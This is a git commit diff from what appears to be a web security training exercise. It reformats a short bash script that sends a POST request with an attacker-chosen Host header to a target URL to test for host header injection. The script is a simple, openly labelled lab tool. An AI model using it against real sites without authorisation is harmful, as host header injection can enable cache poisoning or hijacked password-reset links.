7d71442962839927b6bebdd5e4b9d90f7e9631f7
nairbh <houcinenair@proton.me>
2025-01-20 12:09:57 -0500

    update

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,2 +1,6 @@
 #!/bin/bash
-NEW_HOST="$1"; TARGET_URL="$2"; FORM_DATA="$3"; curl -s -X POST -H "Host: $NEW_HOST" --data-urlencode "$FORM_DATA" "$TARGET_URL"
+NEW_HOST="$1"
+TARGET_URL="$2"
+FORM_DATA="$3"
+
+curl -s -X POST -H "Host: $NEW_HOST" --data-urlencode "$FORM_DATA" "$TARGET_URL"
